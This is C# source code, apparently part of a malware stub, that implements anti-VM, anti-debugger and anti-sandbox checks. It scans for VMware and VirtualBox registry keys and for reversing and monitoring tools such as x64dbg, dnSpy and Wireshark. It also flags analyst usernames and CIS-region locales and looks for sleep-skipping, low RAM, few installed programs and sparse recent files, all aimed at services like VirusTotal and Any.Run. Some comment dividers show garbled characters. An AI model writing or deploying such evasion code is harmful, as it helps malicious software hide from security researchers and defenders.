    // â"€â"€ Anti-VM â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€

    public static bool IsVirtualMachine()
    {
        try
        {
            // Check BIOS registry for VM indicators
            using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\BIOS"))
            {
                if (key != null)
                {
                    var biosVersion = key.GetValue("BIOSVersion")?.ToString();
                    var systemManufacturer = key.GetValue("SystemManufacturer")?.ToString();
                    var systemProductName = key.GetValue("SystemProductName")?.ToString();

                    if (biosVersion != null && (biosVersion.Contains("VMware") || biosVersion.Contains("VirtualBox") || biosVersion.Contains("VBOX")))
                        return true;
                    if (systemManufacturer != null && (systemManufacturer.Contains("VMware") || systemManufacturer.Contains("innotek")))
                        return true;
                    if (systemProductName != null && (systemProductName.Contains("VMware") || systemProductName.Contains("VirtualBox")))
                        return true;
                }
            }

            // Check for VMware tools registry
            using (var vmwareKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\VMware, Inc.\VMware Tools"))
            {
                if (vmwareKey != null)
                    return true;
            }

            // Check for VirtualBox registry
            using (var vboxKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Oracle\VirtualBox Guest Additions"))
            {
                if (vboxKey != null)
                    return true;
            }
        }
        catch { }

        return false;
    }
    // â"€â"€ Anti-Detect (sandbox/analysis) â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€

    // High-confidence: actual debuggers/reversing tools — 3 points each
    private static readonly string[] DebuggerProcesses = [
        "ollydbg", "x64dbg", "x32dbg", "ida", "ida64", "idaq", "idaq64",
        "windbg", "dnspy", "dotpeek", "pestudio", "die", "lordpe", "pe-bear",
        "resourcehacker"
    ];

    // Medium-confidence: monitoring/network tools — 1 point each
    private static readonly string[] MonitoringProcesses = [
        "processhacker", "procmon", "procexp",
        "wireshark", "fiddler", "charles", "tcpview",
        "sandboxie", "cuckoo", "regmon", "filemon",
        "autoruns", "tcpdump", "dumpcap", "httpdebugger"
    ];

    private static readonly string[] SuspiciousUsers = [
        "sandbox", "virus", "malware", "sample",
        "currentuser", "analyst", "tequilaboomboom",
        "sand box", "maltest", "plmsqjvtest",
        "bruno", "fred", "maria", "janusz",
    ];

    // ISO 3166-1 alpha-2 codes of blacklisted regions
    private static readonly string[] BlacklistedCountries = ["RU", "BY", "KZ", "AM", "AZ", "KG", "TJ", "TM", "UZ", "MD"];

    public static bool IsAnalysisEnvironment()
    {
        int score = 0;

        // Check running processes with weighted scoring
        try
        {
            foreach (var p in Process.GetProcesses())
            {
                try
                {
                    var name = p.ProcessName.ToLowerInvariant();
                    foreach (var b in DebuggerProcesses)
                    {
                        if (name.Contains(b))
                        {
                            score += 3;
                            StubLog.Info($"[AntiDetect] Debugger detected: {name} (+3, total={score})");
                            break;
                        }
                    }
                    foreach (var b in MonitoringProcesses)
                    {
                        if (name.Contains(b))
                        {
                            score += 1;
                            StubLog.Info($"[AntiDetect] Monitor detected: {name} (+1, total={score})");
                            break;
                        }
                    }
                }
                catch { }
                finally { p.Dispose(); }
            }
        }
        catch { }

        // Suspicious username — 2 points
        var user = Environment.UserName.ToLowerInvariant();
        foreach (var u in SuspiciousUsers)
        {
            if (user.Contains(u))
            {
                score += 2;
                StubLog.Info($"[AntiDetect] Suspicious user: {user} (+2, total={score})");
                break;
            }
        }

        // Blacklisted region — read from registry (works with InvariantGlobalization=true)
        try
        {
            // HKCU\Control Panel\International → LocaleName = "ru-RU", "en-US", etc.
            using var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Control Panel\International");
            var locale = key?.GetValue("LocaleName")?.ToString() ?? "";
            // Extract country code: "ru-RU" → "RU"
            var dash = locale.IndexOf('-');
            var code = (dash >= 0 ? locale[(dash + 1)..] : locale).ToUpperInvariant();
            foreach (var c in BlacklistedCountries)
            {
                if (code == c)
                {
                    score += 3;
                    StubLog.Info($"[AntiDetect] Blacklisted region: {code} (+3, total={score})");
                    break;
                }
            }
        }
        catch { }

        // Generic/broadcast CPU name — VMs that don't pass real CPU info
        try
        {
            using var cpuKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                @"HARDWARE\DESCRIPTION\System\CentralProcessor\0");
            if (cpuKey != null)
            {
                var cpu = cpuKey.GetValue("ProcessorNameString")?.ToString()?.Trim() ?? "";
                if (cpu.Equals("Intel Processor", StringComparison.OrdinalIgnoreCase)
                    || cpu.StartsWith("Intel(R) Processor", StringComparison.OrdinalIgnoreCase)
                    || cpu.Length == 0)
                {
                    score += 3;
                    StubLog.Info($"[AntiDetect] Generic CPU: '{cpu}' (+3, total={score})");
                }
            }
        }
        catch { }

        if (score >= 3)
            StubLog.Info($"[AntiDetect] BLOCKED — score={score} (threshold=3)");

        return score >= 3;
    }

    // â"€â"€ Anti-Sandbox (VirusTotal / Triage / Any.Run) â"€

    public static bool IsSandbox()
    {
        int score = 0;

        // Uptime check
        if (Environment.TickCount64 < 3 * 60 * 1000) score++;

        // Multi-stage sleep verification — each stage must not be fast-forwarded
        // Forces the sandbox to either spend 1.2s or reveal itself on first skip
        for (int stage = 0; stage < 3; stage++)
        {
            int ms = 300 + stage * 100; // 300, 400, 500ms
            var sw = Stopwatch.StartNew();
            Thread.Sleep(ms);
            sw.Stop();
            if (sw.ElapsedMilliseconds < ms * 0.8)
            {
                score += 2;
                StubLog.Info($"[AntiSandbox] Sleep-skip stage {stage}: {sw.ElapsedMilliseconds}ms (+2)");
                break;
            }
        }

        // CPU compute check — emulators fast-forward Sleep but can't hide CPU execution cost
        try
        {
            long t0 = Environment.TickCount64;
            long acc = unchecked((long)0x9e3779b97f4a7c15L);
            for (long i = 0; i < 50_000_000L; i++)
                acc = unchecked(acc * 6364136223846793005L + 1442695040888963407L ^ (acc >> 33));
            GC.KeepAlive(acc);
            if (Environment.TickCount64 - t0 < 50)
            {
                score++;
                StubLog.Info("[AntiSandbox] CPU compute too fast (+1)");
            }
        }
        catch { }

        // Temp files count
        try
        {
            if (Directory.GetFiles(Path.GetTempPath()).Length < 3) score++;
        }
        catch { }

        // Installed programs count
        try
        {
            using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall");
            if (key != null && key.GetSubKeyNames().Length < 8) score++;
        }
        catch { }

        // RAM check
        try
        {
            var memStatus = new MEMORYSTATUSEX { dwLength = (uint)Marshal.SizeOf<MEMORYSTATUSEX>() };
            if (GlobalMemoryStatusEx(ref memStatus) && memStatus.ullTotalPhys < 1UL * 1024 * 1024 * 1024)
                score++;
        }
        catch { }

        // Screen resolution — headless/minimal sandbox displays
        try
        {
            int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
            if (w < 1024 || h < 600)
            {
                score++;
                StubLog.Info($"[AntiSandbox] Low resolution: {w}x{h} (+1)");
            }
        }
        catch { }

        // Recent files — sandboxes have pristine user profiles
        try
        {
            var recent = Environment.GetFolderPath(Environment.SpecialFolder.Recent);
            if (Directory.Exists(recent) && Directory.GetFiles(recent, "*.lnk").Length < 5)
                score++;
        }
        catch { }

        return score >= 3;
    }
}

